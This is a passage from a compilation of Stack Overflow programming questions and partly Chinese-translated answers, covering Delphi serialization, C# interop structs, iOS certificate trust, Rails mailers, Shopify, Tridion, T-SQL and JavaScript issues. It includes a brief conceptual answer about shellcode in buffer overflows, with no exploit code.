```

Now, let's say I have these classes defined somewhere in my app:

```
type
    TExampleClass = class(TSerializable)
    private
        { Private declarations }
        FIntProp: Integer;
    public
        { Public declarations }
        constructor Create();

        procedure LoadFromStream(const S: TStream); override;
        procedure SaveToStream(const S: TStream); override;

        property IntProp: Integer read FIntProp write FIntProp;
    end;

    TAnotherExample = class(TSerializable)
    private
        { Private declarations }
        FStringProp: String;
    public
        { Public declarations }
        constructor Create();

        procedure LoadFromStream(const S: TStream); override;
        procedure SaveToStream(const S: TStream); override;

        procedure ReverseStringProp();

        property StringProp: String read FStringProp write FStringProp;
    end; 
```

I'm planning to store such objects in a list:

```
var
    MS: TMemoryStream;
    SomeList: TObjectList<TSerializable>;
begin
    MS := TMemoryStream.Create();
    SomeList := TObjectList<TSerializable>.Create(True);
    try
        SomeList.Add(TExampleClass.Create());
        SomeList.Add(TAnotherClass.Create());

        TExampleClass(SomeList[0]).IntProp := 1992;
        TAnotherClass(SomeList[1]).StringProp := 'Some value';

        //  Here, a method to serialize the list...
        SerializeList(SomeList, MS);

        //  Clear the list and reset position in the stream.
        SomeList.Clear();
        MS.Seek(0, soFromBeginning);

        //  Unserialize the list.
        UnserializeList(SomeList, MS);

        //  Should display "Some value".
        Writeln(TAnotherClass(SomeList[1]).StringProp);
    finally
        SomeList.Free();
        MS.Free();
    end;
end; 
```

Now, how could I possibly serialize the whole list to stream and then re-create the list from that stream?

What I was thinking about was:

1.  Iterate through the list.
2.  Write each object's class name to the stream first.
3.  Call `SaveToStream()` on that object.

But for that approach to work, I would need to create some kind of a class register, which would be some kind of a dictionary to store known classes. It sounds like a good idea, but then I would need to call some `RegisterClass()` method to add every new class to the dictionary, and I don't like that way too much.

Is there any other way, or should I just do it the way I proposed?

Thanks a bunch.

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-19T20:35:49.650

谢谢你们的提示。我决定使用我自己的方法，这可能不是最好的方法，但适合我的小项目的需要。

我想有人可能会对这种方法感兴趣，所以我把它贴在这里。

基本上，我决定建立一个基类`TSerializable`：

```
type
  TSerializable = class abstract(TObject)
  public
    { Public declarations }
    procedure LoadFromStream(const S: TStream); virtual; abstract;
    procedure SaveToStream(const S: TStream); virtual; abstract;
  end; 
```

每个后代类都需要分别实现`LoadFromStream()`和`SaveToStream()`处理保存到流。编写一些通用方法可能会很好，它们会自动加载/保存所有类属性。

然后，我有这个小班：

```
type
  TSerializableList = class(TObjectList<TSerializable>)
  public
    procedure Serialize(const S: TStream);
    procedure UnSerialize(const S: TStream);
  end; 
```

代码是：

```
{ TSerializableList }

procedure TSerializableList.Serialize(const S: TStream);
var
  CurrentObj: TSerializable;
  StrLen, StrSize: Integer;
  ClsName: String;
begin
  S.Write(Self.Count, SizeOf(Integer));
  for CurrentObj in Self do
  begin
    ClsName := CurrentObj.QualifiedClassName();
    StrLen := Length(ClsName);
    StrSize := SizeOf(Char) * StrLen;

    S.Write(StrLen, SizeOf(Integer));
    S.Write(StrSize, SizeOf(Integer));
    S.Write(ClsName[1], StrSize);

    CurrentObj.SaveToStream(S);
  end;
end;

procedure TSerializableList.UnSerialize(const S: TStream);
var
  I, NewIdx, TotalCount, Tmp, Tmp2: Integer;
  ClsName: String;
  Context: TRttiContext;
  RttiType: TRttiInstanceType;
begin
  Context := TRttiContext.Create();
  try
    S.Read(TotalCount, SizeOf(Integer));
    for I := 0 to TotalCount -1 do
    begin
      S.Read(Tmp, SizeOf(Integer));
      S.Read(Tmp2, SizeOf(Integer));

      SetLength(ClsName, Tmp);
      S.Read(ClsName[1], Tmp2);

      RttiType := (Context.FindType(ClsName) as TRttiInstanceType);
      if (RttiType <> nil) then
      begin
        NewIdx := Self.Add(TSerializable(RttiType.MetaclassType.Create()));
        Self[NewIdx].LoadFromStream(S);
      end;
    end;
  finally
    Context.Free();
  end;
end; 
```

又快又脏，但可以满足我的需要。

**注意** 由于代码使用扩展的 RTTI，它不会在旧的 Delphi 版本中编译。此外，您可能需要添加`{$STRONGLINKTYPES ON}`您的 DPR 文件或发明一些其他机制，以便链接器不会跳过您的课程（David Heffernan[在此处](https://stackoverflow.com/a/10613212/759049)提出一种方法）

# c# - C/C++ Interoperability Naming Conventions with C#

> ID：13957362
> 
> 赞同：12
> 
> 时间：2012-12-19T17:00:15.933
> 
> 标签：c#, c++, c, winapi, pinvoke

Consider the following Win32 API struct:

```
typedef struct _SECURITY_ATTRIBUTES {
  DWORD  nLength;
  LPVOID lpSecurityDescriptor;
  BOOL   bInheritHandle;
} SECURITY_ATTRIBUTES, *PSECURITY_ATTRIBUTES, *LPSECURITY_ATTRIBUTES; 
```

When porting this object to C#, should I follow the name naming conventions used here, like so:

```
public struct _SECURITY_ATTRIBUTES
{
    public int nLength;
    public unsafe byte* lpSecurityDescriptor;
    public int bInheritHandle;
} 
```

or can I go all out, and write my struct in a C# style, like so:

```
public struct SecurityAttributes
{
    private int length;
    private unsafe byte* securityDescriptor;
    private int bInheritHandle;

    public Int32 Length
    {
        get { return this.length; }
        set { this.length = value; }
    }

    public Byte* SecurityDescriptor
    {
        get { return this.seurityDescriptor; }
        set { this.securityDescriptor = value; }
    }

    public Int32 InheritHandle
    {
        get { return this.bInheritHandle; }
        set { this.bInheritHandle = value; }
    }

    public SecurityAttributes(int length, byte* securityDescriptor, int inheritHandle)
    {
        this.length = length;
        this.securityDescriptor = securityDescriptor;
        this.inheritHandle = inheritHandle;
    }
} 
```

Whilst the second approach seems much more elegant, I would like to know if it is advisable to invoke native functionality using a struct written in that fashion, or if there are any other pitfalls when porting structs from C/C++.

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-12-19T19:12:16.320

这取决于您的个人喜好。您选择哪种方法的主要考虑因素应该是易于代码维护。就我个人而言，我倾向于坚持使用与 C 声明中使用的名称完全相同的名称，因为这样更容易理解我在看什么。例如，如果我这样定义一个结构：

```
/// <summary>
/// Unmanaged sockaddr_in structure from Ws2def.h.
/// </summary>
[StructLayoutAttribute(LayoutKind.Sequential, CharSet = CharSet.Ansi)]
public struct sockaddr_in
{
    /// <summary>
    /// short sa_family;
    /// </summary>
    public short sa_family;

    /// <summary>
    /// unsigned short sin_port;
    /// </summary>
    public ushort sin_port;

    /// <summary>
    /// struct in_addr addr;
    /// </summary>
    [MarshalAs(UnmanagedType.ByValArray, ArraySubType = UnmanagedType.I1, SizeConst = 4)]
    public byte[] addr;

    /// <summary>
    /// char sin_zero[8];
    /// </summary>
    [MarshalAs(UnmanagedType.ByValArray, ArraySubType = UnmanagedType.I1, SizeConst = 8)]
    public byte[] sin_zero;
} 
```

稍后我或同事想知道到底`sa_family`是什么，我们可以在 sa_family 上搜索文档。如果我有一个 Family 属性，我将有一个额外的步骤来确定它映射到 sa_family。

当然，我可以在结构上放置命名良好的 getter 和 setter，例如，`public short Family...`但是，我尝试将互操作结构和方法隐藏在更易于使用的接口后面。似乎没有必要增加低级互操作定义。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-12-19T19:28:52.903

我认为这不应该是个人喜好。如果要将代码移植到另一种语言，则应应用要移植到的语言的约定。

我当然会使用 C# 约定，因为代码将由 C# 开发人员使用，而不是 C/C++ 开发人员，对吧？否则我们仍然会`_int32 DWORD`在 C# 中使用丑陋的代码。

以下是 C# 约定的一些很好的指南：

*   [C# 编码标准 - 和命名约定](http://www.dofactory.com/reference/csharp-coding-standards.aspx)
*   [C# 编码约定（C# 编程指南）](http://msdn.microsoft.com/en-us/library/vstudio/ff926074.aspx)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-12-21T10:07:42.187

为了完整起见，我添加了这个答案。它结合了 Mert 和 dgvid 答案的要点。这是一个使用 Win32 RECT 结构的示例。

**C/C++ 定义：**

```
typedef struct _RECT {
  LONG left;
  LONG top;
  LONG right;
  LONG bottom;
} RECT, *PRECT; 
```

**C#定义：**

```
namespace NetBlast.Runtime.PlatformInvoke.Windows
{
    #region USING

    using System;
    using System.Collections.Generic;
    using System.Drawing;
    using System.Linq;
    using System.Text;

    #endregion

    /// <summary>
    /// The Rect (RECT) structure defines the coordinates of the upper-left and lower-right corners of a rectangle.
    /// </summary>
    [System.Runtime.InteropServices.StructLayout(System.Runtime.InteropServices.LayoutKind.Sequential)]
    public struct Rect : IEquatable<Rect>, IEquatable<Rectangle>, ICloneable
    {
        #region CONSTANTS

        #endregion

        #region VARIABLES

        /// <summary>
        /// Win32 RECT.left value.
        /// </summary>
        private int left;

        /// <summary>
        /// Win32 RECT.top value.
        /// </summary>
        private int top;

        /// <summary>
        /// Win32 RECT.right value.
        /// </summary>
        private int right;

        /// <summary>
        /// Win32 RECT.bottom value.
        /// </summary>
        private int bottom;

        #endregion

        #region PROPERTIES

        /// <summary>
        /// Gets or sets the x-coordinate of the upper-left corner of the rectangle.
        /// </summary>
        public Int32 Left
        {
            get { return this.left; }
            set { this.left = value; }
        }

        /// <summary>
        /// Gets or sets the y-coordinate of the upper-left corner of the rectangle.
        /// </summary>
        public Int32 Top
        {
            get { return this.top; }
            set { this.top = value; }
        }

        /// <summary>
        /// Gets or sets the x-coordinate of the lower-right corner of the rectangle.
        /// </summary>
        public Int32 Right
        {
            get { return this.right; }
            set { this.right = value; }
        }

        /// <summary>
        /// Gets or sets the y-coordinate of the lower-right corner of the rectangle.
        /// </summary>
        public Int32 Bottom
        {
            get { return this.bottom; }
            set { this.bottom = value; }
        }

        /// <summary>
        /// Gets or sets the height of the rectangle.
        /// </summary>
        public Int32 Height
        {
            get { return this.bottom - this.top; }
            set { this.bottom = value + this.top; }
        }

        /// <summary>
        /// Gets or sets the width of the rectangle.
        /// </summary>
        public Int32 Width
        {
            get { return this.right - this.left; }
            set { this.right = value + this.left; }
        }

        /// <summary>
        /// Gets or sets the top, left location of the rectangle.
        /// </summary>
        public Point Location
        {
            get
            {
                return new Point(this.left, this.top);
            }

            set
            {
                this.right = this.left - value.X;
                this.bottom = this.top - value.Y;
                this.left = value.X;
                this.top = value.Y;
            }
        }

        /// <summary>
        /// Gets or sets the size of the rectangle.
        /// </summary>
        public Size Size
        {
            get
            {
                return new Size(this.Width, this.Height);
            }

            set
            {
                this.right = value.Width + this.left;
                this.bottom = value.Height + this.top;
            }
        }

        #endregion

        #region CONSTRUCTORS / FINALIZERS

        /// <summary>
        /// Initializes a new instance of the <see cref="Rect" /> struct.
        /// </summary>
        /// <param name="location">The top, left location of the rectangle.</param>
        /// <param name="size">The size of the rectangle.</param>
        public Rect(Point location, Size size)
        {
            this.left = default(int);
            this.top = default(int);
            this.right = default(int);
            this.bottom = default(int);
            this.Location = location;
            this.Size = size;
        }

        /// <summary>
        /// Initializes a new instance of the <see cref="Rect" /> struct.
        /// </summary>
        /// <param name="left">The x-coordinate of the upper-left corner of the rectangle.</param>
        /// <param name="top">The y-coordinate of the upper-left corner of the rectangle.</param>
        /// <param name="right">The x-coordinate of the lower-right corner of the rectangle.</param>
        /// <param name="bottom">The y-coordinate of the lower-right corner of the rectangle.</param>
        public Rect(int left, int top, int right, int bottom)
        {
            this.left = left;
            this.top = top;
            this.right = right;
            this.bottom = bottom;
        }

        #endregion

        #region OPERATORS

        /// <summary>
        /// Provides implicit casting from Rect to Rectangle.
        /// </summary>
        /// <param name="rectangle">The Rect instance to cast.</param>
        /// <returns>A Rectangle representation of the Rect instance.</returns>
        public static implicit operator Rectangle(Rect rectangle)
        {
            return new Rectangle(rectangle.Location, rectangle.Size);
        }

        /// <summary>
        /// Provides implicit casting from Rectangle to Rect.
        /// </summary>
        /// <param name="rectangle">The Rectangle instance to cast.</param>
        /// <returns>A Rect representation of the Rectangle instance.</returns>
        public static implicit operator Rect(Rectangle rectangle)
        {
            return new Rect(rectangle.Location, rectangle.Size);
        }

        /// <summary>
        /// Performs an equality check between two instances of Rect.
        /// </summary>
        /// <param name="a">Instance a of Rect.</param>
        /// <param name="b">Instance b of Rect.</param>
        /// <returns>True if the instances are equal, otherwise false.</returns>
        public static bool operator ==(Rect a, Rect b)
        {
            return a.Equals(b);
        }

        /// <summary>
        /// Performs an inequality check between two instances of Rect.
        /// </summary>
        /// <param name="a">Instance a of Rect.</param>
        /// <param name="b">Instance b of Rect.</param>
        /// <returns>True if the instances are not equal, otherwise false.</returns>
        public static bool operator !=(Rect a, Rect b)
        {
            return !a.Equals(b);
        }

        #endregion

        #region STATIC METHODS

        #endregion

        #region INSTANCE METHODS

        /// <summary>
        /// Indicates whether the current object is equal to another object of the same type.
        /// </summary>
        /// <param name="obj">An object to compare with this object.</param>
        /// <returns>True if the instances are not equal, otherwise false.</returns>
        public override bool Equals(object obj)
        {
            return this.Equals((Rect)obj);
        }

        /// <summary>
        /// Serves as a hash function for this instance of Rect.
        /// </summary>
        /// <returns>A hash code for the current Rect.</returns>
        public override int GetHashCode()
        {
            return ObjectUtilities.CreateHashCode(this.left, this.top, this.right, this.bottom);
        }

        /// <summary>
        /// Returns a string representation of this instance.
        /// </summary>
        /// <returns>A string representation of this instance.</returns>
        public override string ToString()
        {
            return string.Format("Left: {0}; Top: {1}; Right: {2}; Bottom: {3};", this.left, this.top, this.right, this.bottom);
        }

        /// <summary>
        /// Indicates whether the current object is equal to another object of the same type.
        /// </summary>
        /// <param name="other">A Rect instance to compare with this object.</param>
        /// <returns>True if the instances are not equal, otherwise false.</returns>
        public bool Equals(Rect other)
        {
            return this.left == other.left
                && this.top == other.top
                && this.right == other.right
                && this.bottom == other.bottom;
        }

        /// <summary>
        /// Indicates whether the current object is equal to another object of the same type.
        /// </summary>
        /// <param name="other">A Rectangle instance to compare with this object.</param>
        /// <returns>True if the instances are not equal, otherwise false.</returns>
        public bool Equals(Rectangle other)
        {
            return this.left == other.Left
                && this.top == other.Top
                && this.right == other.Right
                && this.bottom == other.Bottom;
        }

        /// <summary>
        /// Returns a clone of this Rect instance.
        /// </summary>
        /// <returns>A clone of this Rect instance.</returns>
        public object Clone()
        {
            return new Rect(this.left, this.top, this.right, this.bottom);
        }

        #endregion

        #region DELEGATES & EVENTS

        #endregion

        #region CLASSES & STRUCTURES

        #endregion
    }
} 
```

我觉得这将提供一个有点完整的解决方案，并且在与本机代码调用一起使用时应该适当地映射。

**附加工作：**

此结构当前允许从 System.Drawing 命名空间使用 Size、Point。由于 Win32 也有 Size 和 Point 结构，因此也允许使用它们是合适的。

# ios - Temporarily trusting self-signed certificates with NSURLConnection

> ID：13957369
> 
> 赞同：4
> 
> 时间：2012-12-19T17:00:40.130
> 
> 标签：ios, ssl, https, nsurlconnection, ssl-certificate

I have an app that displays a warning to the user when they attempt to contact a server with a self-signed or otherwise untrusted SSL certificate. If they choose to proceed, we use connection:didReceiveAuthenticationChallenge to continue with the HTTPS request by creating a credential for the server trust. This is the common way that connections are made to untrusted servers on iOS.

What I'm wondering if there's a way to only create this server trust for a particular connection, or if it's possible to rescind the trust at a later time. What we've found is that the server trust lasts for as long as the app is running. We'd like to be able to prompt the user again at a later time to make sure they still want to proceed. Is this possible? Is there a way for the trust to only "last" for one connection, or to find the trust and somehow remove it so that we go through the process again for that same server?

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-19T17:39:01.013

收到数据后你不释放连接吗？如果您要发布它，它应该每次都询问。确保未启用连接的缓存属性

# ruby-on-rails-3 - Error when using ActionMailer in Rails3

> ID：13957370
> 
> 赞同：1
> 
> 时间：2012-12-19T17:00:40.373
> 
> 标签：ruby-on-rails-3, rails-3-upgrade

Currently i'm trying to port my application to Rails 3.0 from 2.3.14 and I'm struck on the following error and this works fine in 2.3.14

My mailer code looks like

```
def welcome_mail(host,vendor_name,from, batch, sent_at = Time.now)
  template = MailTemplate.get_template(self.class.to_s,:welcome_mail.to_s,vendor_name,
              :greeting => batch.greeting, :batch => batch, :host =>host)
  @html_message = template.html_message
  @text_message = template.text_message
  mail( :subject => batch.subject, :to => get_recipients(batch), :from =>  from, :date =>  sent_at ) do |format|
    format.html
    format.text
  end
end 
```

I pick up the email content from DB using MailTemplate model.

And my mailer view (welcome_mail.text.html.erb and welcome_mail.text.plain.erb contain only this line

```
<%=@html_message%> - welcome_mail.text.html.erb
<%=@text_message%> - welcome_mail.text.plain.erb 
```

Inside the template, that is fetched from DB, i'm using a named route (which is a nested route) profile_batch_url and is supposed to produce a url like /profile/:profile_id/batch/:batch_id

But when I try to create a message

```
mail = UserMailer.welcome_email(request.host_with_port,get_vendor_name(),email, batch) 
```

I'm getting the following error

```
NameError: undefined local variable or method `controller' for #<MailTemplate:0x000000060dff38>
/usr/local/rvm/gems/ruby-1.9.3-p327/gems/activemodel-3.0.17/lib/active_model/attribute_methods.rb:392:in `method_missing'
/usr/local/rvm/gems/ruby-1.9.3-p327/gems/activerecord-3.0.17/lib/active_record/attribute_methods.rb:46:in `method_missing'
/usr/local/rvm/gems/ruby-1.9.3-p327/gems/actionpack-3.0.17/lib/action_view/helpers/url_helper.rb:31:in `url_options'
/usr/local/rvm/gems/ruby-1.9.3-p327/gems/actionpack-3.0.17/lib/action_dispatch/routing/url_for.rb:131:in `url_for'
/usr/local/rvm/gems/ruby-1.9.3-p327/gems/actionpack-3.0.17/lib/action_view/helpers/url_helper.rb:99:in `url_for'
/usr/local/rvm/gems/ruby-1.9.3-p327/gems/actionpack-3.0.17/lib/action_dispatch/routing/route_set.rb:201:in `profile_batch_url'
(erb):5:in `text_message' 
```

Can anyone help me in fixing this?

Thanks,
Sivakumar

# shopify - How to tell if a product is published or not?

> ID：13957371
> 
> 赞同：2
> 
> 时间：2012-12-19T17:00:43.293
> 
> 标签：shopify

I'd like to use the `published` field on products that's documented here in the [Shopify API](http://api.shopify.com/product.html#update):

> Hide a published product by changing the published attribute to false

I can change the flag on any product, but I have not figured out yet how to get the `published` field back from the API. It's not listed the [list of fields of the `Product` object](http://api.shopify.com/product.html#show).

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-12-19T17:08:45.340

您可以`published_at`直接设置单个产品的字段，如下[所述](http://wiki.shopify.com/Using_the_shopify_api_gem_with_the_credentials_of_a_private_application#Hide_.E2.80.94_or_publish_.E2.80.94_a_bunch_of_products)：

```
product.published_at = nil; product.save              # hides product
product.published_at = Time.now.utc; product.save     # makes product visible 
```

您还可以通过设置`published`为 false 来隐藏产品集合，如下[所述](http://ecommerce.shopify.com/c/shopify-apps/t/api-product-collection-hide-publish-28916#comment-28919)：

```
collection = ShopifyAPI::CustomCollection.find(params[:collection_id])
collection.published = false
collection.save 
```

**更新**

现在我更好地理解了这个问题，这就是你想要的答案。您无法真正获得“已发布”值，因为`published`产品上并没有真正的属性。但是，您可以检查该`published_at`字段并检查它是否`nil`（未发布）。设置`published = false`显然为您将其设置为 nil 。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2016-05-12T05:00:09.657

您可以很容易地获得已发布的状态。它在 API 中作为端点：published_status 这返回已发布、未发布和任何。 [https://help.shopify.com/api/reference/product](https://help.shopify.com/api/reference/product) 用法：

```
To get an array of all published products:
GET /admin/products.json?publish_status=published

To get an array of all unpublished products:
GET /admin/products.json?publish_status=unpublished 
```

然后迭代数组，找到你想要的产品。一些执行此操作的示例 php：

```
function isPublished($shopify, $myprodid) {
  $products = $shopify('GET /admin/products.json?publish_status=unpublished');
  foreach($products as $prod) {
    if($prod['id'] == $myprodid)
      return false;
  }
  return true
} 
```

除非您有大量未发布的产品，否则迭代未发布的产品应该很快。然后交换测试。

# tridion - SDL Tridion GetListKeywords using Anquilla Framework

> ID：13957372
> 
> 赞同：8
> 
> 时间：2012-12-19T17:00:43.743
> 
> 标签：tridion, tridion-2011

I'm writing a GUI extension and using the Anquilla framework to get a list of `Keywords` within a `Category`. I'm obtaining an XML document for the list of keywords then working with that document within my extension.

My problem is that the returned XML doesn't contain the Keyword's '`Description`' value. I have the Title and Key etc.

My original code looks like this:

```
var category = $models.getItem("CATEGORYTCMID:);
var list = category.getListKeywords();
list.getXml(); 
```

A typical node returned is this:

```
<tcm:Item ID="tcm:4-1749-1024" 
Type="1024" Title="rate_one" Lock="0" IsRoot="true" 
Modified="2012-12-17T23:01:59" FromPub="010 Schema" 
Key="rate_one_value" IsAbstract="false" 
CategoryTitle="TagSelector" 
CategoryID="tcm:4-469-512" Icon="T1024L0P0" 
Allow="268560384" Deny="96" IsNew="false" 
Managed="1024"/></tcm:ListKeywords> 
```

So I've tried using a Filter to give me additional column information:

```
var filter = new Tridion.ContentManager.ListFilter();
filter.columns = Tridion.Constants.ColumnFilter.EXTENDED;
var list = category.getListKeywords(filter); 
```

Unfortunately this only gives the additional XML attributes:

```
IsShared="true" IsLocalized="false" 
```

I'd really like the description value to be part of this XML without having to create a Keyword object from the XML. Is such a thing possible?

*cough* any ideas? *cough*

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-12-19T17:06:16.467

恐怕您必须加载关键字本身才能获得说明。它未在任何列表中使用，因此未在 XML 中返回。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-12-19T18:14:55.067

您总是可以创建一个[List Extender](http://sdllivecontent.sdl.com/LiveContent/content/en-US/SDL_Tridion_2011_SPONE/task_E4EFBE6E5CA24C01B2531FB15AE95AE2)来将此信息添加到列表中，但请尽量小心，因为每次调用 GetList 时都会执行此扩展器。

不会让您不必打开列表中的每个关键字，但您将在服务器端进行（例如使用 Core Service/NetTcp），这可能比使用 Anguilla 打开每个关键字更容易和更快。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-12-21T15:50:20.387

在这种情况下，我只需要一个关键字，所以我只需从 CMS 中获取它。在安圭拉获取对象有点奇怪，代码如下：

1.  在您的主要代码区域：

    ```
     var selectedKy = $models.getItem("TcmUriOfKeywordHere");
       if (selectedKy.isLoaded()) {
         p.selectedKy = selectedKy;
         this.onselectedKyLoaded();
       } else {
         $evt.addEventHandler(selectedKy, "load", this.onselectedKyLoaded);
         selectedKy.load();
       } 
    ```

    值得注意的是我如何将关键字存储在项目的属性中，因此我可以在`onselectedKyLoaded`函数中获取它

2.  加载项目后调用的函数

    ```
     ContentBloom.ExampleGuiExtension.prototype.onselectedKyLoaded = function (event) {
         var p = this.properties;
         var selectedDescription = p.selectedKy.getDescription();
         // do what you need to do with the description :)
     }; 
    ```

我解决了这个问题，感谢这里的答案： [https](https://stackoverflow.com/a/12805939/1221032) ://stackoverflow.com/a/12805939/1221032 - Cheers Nuno :)

# sql-server - 在 T-SQL 中生成随机字符串

> ID：13957380
> 
> 赞同：2
> 
> 时间：2012-12-19T17:01:12.497
> 
> 标签：sql-server, tsql

> **可能重复：**
> [使用 T-SQL 生成随机字符串](https://stackoverflow.com/questions/1324063/generating-random-strings-with-t-sql)

我需要在触发器内生成一个带有字母和数字字符的随机字符串。

字符串的长度必须为 15 且大写。

有人有想法吗？

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-12-19T17:08:13.190

这远非最佳解决方案，但它会按规定工作：

```
select char(rand()*26+65)+char(rand()*26+65)+char(rand()*26+65)
      +char(rand()*26+65)+char(rand()*26+65)+char(rand()*26+65)
      +char(rand()*26+65)+char(rand()*26+65)+char(rand()*26+65)
      +char(rand()*26+65)+char(rand()*26+65)+char(rand()*26+65)
      +char(rand()*26+65)+char(rand()*26+65)+char(rand()*26+65) 
```

示例输出：

```
WCZOVRCIRELAJUT 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-12-19T17:03:25.123

生成一个 GUID 并只取前 15 个字符？

生成一堆随机数并转换为它们的 ASCII 值？

# c - Buffer overflow with disabled shell?

> ID：13957382
> 
> 赞同：-1
> 
> 时间：2012-12-19T17:01:18.067
> 
> 标签：c, linux

AFAIK, a buffer overflow is achieved by overwriting memory adjacent to a C variable's buffer. This overwriting is used to spawn a shell which executes commands.

But what if the user that is running the program vulnerable to a buffer overflow has the shell disabled ?

/etc/passwd:

user1:x:1000:1000:user1,,,,:/home/user1:**/bin/false**

sudo -u user1 /usr/bin/programname

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-12-19T17:05:18.650

“Shell disabled”仅**在您实际登录**时才重要。如果您正在利用已经运行的程序，则无需登录。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-19T17:24:10.167

漏洞利用不使用为用户配置的 shell——它们通常包含一个二进制代码[shellcode](http://en.wikipedia.org/wiki/Shellcode)，它在功能上等同于原始 shell，这意味着它将启动任何选定的可执行文件——例如一个真正的 shell 程序。然后欺骗被利用的程序来执行此代码。

网络上有许多不同的 shellcode，例如不包含字节 '\0'，因此它们将作为 C 字符串安全地传递，或者仅包含可打印字符、有效的 unicode 字符串等。

# javascript - How I know the url when wants to make a json request?

> ID：13957383
> 
> 赞同：0
> 
> 时间：2012-12-19T17:01:18.487
> 
> 标签：javascript, json, url, jsonp

Hej,

Seems a bit stupid to ask but really want to know. For example, I want to get the information under the title "Identification" in the following webpage,"http://en.wikipedia.org/wiki/Tag#Identification" then I could use script :

```
<script type="text/javascript">
$(document).ready(function() {
    var url =  "";
    $.getJSON(url + "?callback=?", null, function(wiki) {
      <!-- code -->
});
</script> 
```

but in this case, what's the url should be?

# javascript - window.open when ajax call end, doesn't work

> ID：13957384
> 
> 赞同：2
> 
> 时间：2012-12-19T17:01:20.497
> 
> 标签：javascript, ajax, window.open

i'm doing and Ajax call to send parameters to one .php file, when the call is done, i want to popup a new window to the results page, but it doesn't work.

here is my ajax code

```
 $.ajax({
            type: "POST",
            url: "pipeline2.php",
            data: formData,
            cache: false,
            processData: false,
            contentType: false,
            //async: false,
        }).done(function (data) {
            $("#resultados_pipeline").append(data);
            document.getElementById('Running').style.display = 'none';
            window.open("results_page.php?jid="+job_id);
            alert(job_id);
        }); 
```

i first think that maybe the job_id is not set in ajax, but the alert show me the expected...

i also tried with the async: true, and it doesn't work either

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-19T17:21:38.007

浏览器不允许`window.open`调用，除非涉及到*用户*触发的事件。

Ajax 响应事件不是由用户触发的，因此此时会阻止弹出窗口。

# jquery - Can't get .selected class to change on nav item click

> ID：13957385
> 
> 赞同：1
> 
> 时间：2012-12-19T17:01:23.110
> 
> 标签：jquery, selecteditem, jquery-isotope

Despite almost completely copying this filtering [demo](http://isotope.metafizzy.co/demos/filtering.html), I still can't get the the plugin to remove the `.selected` class from the current element and add it to the one being clicked.

The current result is that the items do filter, but the `.selected` class remains assigned to `<li><a href="#videos" data-filter="*" class="selected">All</a></li>`.

**HTML**

```
<ul class="category_navigation option-set" data-option-key="filter"> 
    <li><a href="#videos" data-filter="*" class="selected">All</a></li>
    <li><a href="#videos" data-filter=".feature">Feature</a></li>
    <li><a href="#videos" data-filter=".commercial">Commercial</a></li>
    <li><a href="#videos" data-filter=".music_video">Music Video</a></li>
    <li><a href="#videos" data-filter=".trailer-promo">Trailer/Promo</a></li>
    <li><a href="#videos" data-filter=".digital">Digital</a></li>
</ul> 
```

**Javascript**

```
// cache container
var $container = $('.videos');
// initialize isotope
$container.isotope({
});

// filter items when filter link is clicked
$('[href="#videos"]').click(function(){
  var selector = $(this).attr('data-filter');
  $container.isotope({ filter: selector });
  return false;
}); 
```

**Item HTML sample**

```
<li class="trailer-promo">
    <a href='http://player.vimeo.com/video/55078437?autoplay=1' 
        class='lightview' 
        data-lightview-group='trailer/promo'
        data-lightview-type='iframe' 
        data-lightview-title="KUNG FU PANDA 2"
        data-lightview-caption="20 Intl.<br>Dir: Dreamworks/Aspect Ratio"
        data-lightview-options="width: 796, height: 447, viewport: 'scale'">
        <img src="img/video_thumbs/TRAILER_KUNG-FU-PANDA_2.jpg" alt="">
        <p>KUNG FU PANDA 2</p>
    </a>
</li>

<li class="feature">
    <a href='http://player.vimeo.com/video/16129275?autoplay=1' 
        class='lightview' 
        data-lightview-group='feature'
        data-lightview-type='iframe' 
        data-lightview-title="RAY CHARLES AMERICA"
        data-lightview-caption="Client: Tremolo Productions<br>Dir: Alexis Spraic"
        data-lightview-options="width: 796, height: 447, viewport: 'scale'">
        <img src="img/video_thumbs/FEATURE_RAY-CHARLES-AMERICA.jpg" alt="">
        <p>RAY CHARLES AMERICA</p>
    </a>
</li>

<li class="commercial">
    <a href='http://player.vimeo.com/video/28387434?autoplay=1' 
        class='lightview' 
        data-lightview-group='commercial'
        data-lightview-type='iframe' 
        data-lightview-title="VIEWDLE"
        data-lightview-caption="Third Eye<br>Dir: Blake & Nic"
        data-lightview-options="width: 796, height: 447, viewport: 'scale'">
        <img src="img/video_thumbs/COMMERCIAL_THIRD-EYE.jpg" alt="">
        <p>VIEWDLE</p>
    </a>
</li> 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-19T17:22:21.843

我没有看到任何代码来实际删除该类。我对那个插件一无所知，但你可以这样做：

```
$(".selected").removeClass("selected"); 
```

并将该类添加回您需要/希望将其附加到的任何元素。

# .net - 在 .NET 中运行 BAT 程序

> ID：13957389
> 
> 赞同：2
> 
> 时间：2012-12-19T17:01:35.017
> 
> 标签：.net, console-application, phantomjs

我试图让 Phantom.JS 在 Windows 计算机上运行，​​并将它作为 BAT 文件工作。我可以打开一个控制台窗口，启动 BAT 文件，一切似乎都可以正常工作。也就是说，输出对于控制台来说太长了，所以我想在 .NET 控制台应用程序中运行相同的东西。我尝试了很多东西，但一直收到错误消息“phantom.js 未被识别为内部或外部命令”

BAT 文件本身包含以下命令：

```
phantomjs --config=config.json netsniff.js http://google.com 
```

这是我的 .NET 代码：

```
Process compiler = new Process();
compiler.StartInfo.FileName = "cmd.exe"; 
compiler.StartInfo.Arguments = "/C C:\\Test\\getpage.bat";
compiler.StartInfo.UseShellExecute = true;
compiler.Start(); 
```

有人可以帮我弄清楚我做错了什么吗？谢谢！

感谢大家为我解决这个问题。这是一个有效的解决方案：

```
Process compiler = new Process();
compiler.StartInfo.FileName = "cmd.exe";
